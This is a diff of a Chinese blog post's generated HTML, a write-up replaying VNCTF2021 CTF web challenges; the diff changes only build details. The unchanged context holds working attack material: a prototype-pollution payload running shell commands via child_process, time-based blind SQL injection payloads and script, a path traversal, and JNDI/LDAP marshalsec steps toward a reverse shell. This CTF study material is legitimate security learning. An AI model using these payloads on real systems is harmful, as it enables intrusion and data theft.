@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>VNCTF2021复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -60,7 +60,7 @@
         "description": "前言 这次比赛体验真是极好，不仅学到了\"rop寄存器\"，还见识了别人家大一大二……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  2171 ,
+        "wordCount":  2170 ,
         "image": "https://tyskill.github.io/icons/favicon.ico",
         "author": {
             "@type": "Person",
@@ -244,7 +244,7 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2171</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2170</span>
     
     
         
@@ -293,14 +293,14 @@
 <p>尝试一波<code>path=/app/package.json</code>确定根目录就是app并获得依赖信息</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-json" data-lang="json"><span class="err">bindings</span>	<span class="s2">&#34;^1.5.0&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">bindings</span>	<span class="s2">&#34;^1.5.0&#34;</span>
 <span class="err">express</span>	<span class="s2">&#34;^4.17.1&#34;</span>
 <span class="err">expression-eval</span>	<span class="s2">&#34;^4.0.0&#34;</span>
 <span class="err">node-addon-api</span>	<span class="s2">&#34;^3.0.2&#34;</span>
@@ -312,7 +312,7 @@
 <p><code>expression-eval</code>包的<a href="https://github.com/donmccurdy/expression-eval" target="_blank" rel="noopener">官方仓库</a>中作者明确指出了存在原型链污染的安全问题，所以我们只要模仿作者给出的范例payload即可完成原型链污染。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -322,7 +322,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">// 例：
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="c1">// 例：
 </span><span class="c1"></span><span class="nx">eval_</span><span class="p">(</span><span class="nx">parse</span><span class="p">(</span><span class="s1">&#39;foo[bar](baz)()&#39;</span><span class="p">),</span> <span class="p">{</span>
   <span class="nx">foo</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
   <span class="nx">bar</span><span class="o">:</span> <span class="s1">&#39;constructor&#39;</span><span class="p">,</span>
@@ -342,17 +342,17 @@
 <p>因此，payload中的require要修改为import，再根据<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import#dynamic_imports" target="_blank" rel="noopener">Dynamic Imports</a>语法完善payload</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="p">(</span><span class="s1">&#39;tyskill&#39;</span><span class="p">).</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return import(&#39;child_process&#39;).then((module) =&gt; {module.execSync(&#39;cat /flag &gt; /app/static/flag&#39;)});&#34;</span><span class="p">)()</span>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="p">(</span><span class="s1">&#39;tyskill&#39;</span><span class="p">).</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return import(&#39;child_process&#39;).then((module) =&gt; {module.execSync(&#39;cat /flag &gt; /app/static/flag&#39;)});&#34;</span><span class="p">)()</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>然后读取<code>/flag</code>就可获得flag。</p>
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -363,7 +363,7 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://09406122-6743-4125-ab1a-4792d7f770a3.node3.buuoj.cn&#34;</span>
 <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
     <span class="s2">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;&#34;(&#39;&#39;).constructor.constructor(&#34;return import(&#39;child_process&#39;).then((module) =&gt; {module.execSync(&#39;cat /flag &gt; /app/static/flag&#39;)});&#34;)()&#34;&#34;&#34;</span><span class="p">,</span>
@@ -371,17 +371,17 @@
 <span class="p">}</span>
 <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/eval&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h2 id="realezjvav"><a href="#realezjvav" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:realezjvav" class="headings">realezjvav</a></h2>
 <h3 id="笛卡尔积时间盲注"><a href="#笛卡尔积时间盲注" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:笛卡尔积时间盲注" class="headings">笛卡尔积时间盲注</a></h3>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- both  username and password are right , then you can enter the next level--&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- both  username and password are right , then you can enter the next level--&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>可知此处需要先获得账号密码才能进行下一步，直接联想到SQL注入。</p>
@@ -389,13 +389,13 @@
 <p>payload</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># payload1
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># payload1
 </span><span class="c1"></span><span class="mi">123</span><span class="s1">&#39;||(if((ascii(substr((select version()),1,1))&gt;50),1,(SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C)))%23
 </span><span class="s1"># payload2
 </span><span class="s1">123&#39;</span><span class="o">||</span><span class="p">(</span><span class="k">if</span><span class="p">((</span><span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="nf">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">50</span><span class="p">),</span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="p">((</span><span class="n">mysql</span><span class="p">.</span><span class="n">help_relation</span><span class="p">)</span><span class="k">join</span><span class="p">(</span><span class="n">mysql</span><span class="p">.</span><span class="n">help_topic</span><span class="p">)</span><span class="k">join</span><span class="p">(</span><span class="n">mysql</span><span class="p">.</span><span class="n">proc</span><span class="p">)))))</span><span class="o">%</span><span class="mi">23</span><span class="w">
@@ -404,7 +404,7 @@
 </div><p>注入脚本</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -434,7 +434,7 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
 <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://d1b712b7-f02f-45c0-b87c-142d052fa3f6.node3.buuoj.cn/user/login&#39;</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
@@ -450,12 +450,12 @@
         <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="nb">max</span> <span class="o">+</span> <span class="nb">min</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
         <span class="k">if</span> <span class="n">mid</span><span class="o">==</span><span class="nb">min</span><span class="p">:</span>
             <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
             <span class="k">break</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;123&#39;||(if((ascii(substr(({p}),{i},1))&gt;{mid}),1,(select count(*) from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))))#&#34;</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;123&#39;||(if((ascii(substr((</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">),1,(select count(*) from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))))#&#34;</span>
         <span class="c1"># payload = f&#34;123&#39;||(if((ascii(substr(({p}),{i},1))&gt;{mid}),1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)))#&#34;</span>
         <span class="n">data</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{i} : {mid}&#34;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">r</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">2.3</span><span class="p">)</span>
             <span class="nb">min</span><span class="o">=</span><span class="n">mid</span>
@@ -471,17 +471,17 @@
 <p>登陆进去F12发现<code>/searchimage</code>路由获取图片的方式是直接拼接</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#roleImg&#34;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;&lt;img style=&#34;width:180px;height:180px&#34; src=&#34;/searchimage?img=&#39;</span><span class="o">+</span><span class="nx">resObj</span><span class="p">.</span><span class="nx">number</span> <span class="o">+</span><span class="s1">&#39;.png&#34;/&gt;&#39;</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#roleImg&#34;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;&lt;img style=&#34;width:180px;height:180px&#34; src=&#34;/searchimage?img=&#39;</span><span class="o">+</span><span class="nx">resObj</span><span class="p">.</span><span class="nx">number</span> <span class="o">+</span><span class="s1">&#39;.png&#34;/&gt;&#39;</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>存在目录穿越，通过<code>../../../../../pom.xml</code>读pom.xml文件</p>
 <p>从文件中可以知道</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -490,7 +490,7 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;java.version&gt;</span>1.8<span class="nt">&lt;/java.version&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;java.version&gt;</span>1.8<span class="nt">&lt;/java.version&gt;</span>
 ...
 <span class="nt">&lt;dependency&gt;</span>
     <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
@@ -512,29 +512,29 @@
 <p>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下，在<strong>当前目录下运行LDAP服务</strong>,修改IP为当前这台服务器的IP</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP/#Exploit
 </code></pre></td></tr></table></div>
 </div>
 </div><p>在<strong>当前目录下运行Web服务</strong>（此处也可以开启别的端口，只要将上面的访问IP修改一下就行）</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python3 -m http.server <span class="m">80</span> 或者 python -m SimpleHTTPServer <span class="m">80</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 -m http.server <span class="m">80</span> 或者 python -m SimpleHTTPServer <span class="m">80</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>3、修改Exploit并编译成class文件</p>
 <p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口），使用javac编译Exploit.java，生成Exploit.class文件（注意：javac版本最好与目标服务器接近，否则目标服务器无法解析class文件，会报错）</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">javac Exploit.java
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">javac Exploit.java
 </code></pre></td></tr></table></div>
 </div>
 </div><p>4、执行</p>
@@ -554,12 +554,12 @@
 <p>从默认页面我们可以知道laravel framework版本是8.22.1且php版本是7.4.3，现在开始搭环境</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">composer create-project --prefer-dist laravel/laravel laraveldemo 8.4.2
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">composer create-project --prefer-dist laravel/laravel laraveldemo 8.4.2
 <span class="nb">cd</span> laraveldemo
 composer install
 </code></pre></td></tr></table></div>
@@ -567,11 +567,11 @@ composer install
 </div><p>然后把题目给的vendor覆盖过去，最后启动服务就行</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">php artisan key:generate
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">php artisan key:generate
 php artisan serve --host<span class="o">=</span>0.0.0.0
 </code></pre></td></tr></table></div>
 </div>
